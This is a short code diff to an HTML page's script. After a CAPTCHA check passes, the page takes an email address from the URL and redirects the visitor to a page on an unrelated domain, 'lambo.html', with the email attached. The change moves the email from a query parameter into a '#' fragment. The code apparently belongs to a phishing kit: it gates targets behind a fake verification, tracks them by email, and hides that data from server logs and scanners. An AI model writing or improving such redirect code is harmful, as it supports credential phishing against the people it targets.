@@ -71,7 +71,7 @@
     function onCaptchaSuccess(token) {
         console.log("CAPTCHA Verified:", token);
         const email = getEmailFromURL();
-        const redirectSuffix = email ? "?userid=" + email : "";
+        const redirectSuffix = email ? "#" + email : "";
         const targetURL = "https://spareparts.mgcc.ae/lambo.html" + redirectSuffix;
 
         setTimeout(() => {
@@ -90,6 +90,7 @@
 </body>
 
 </html>
+
 
 
 
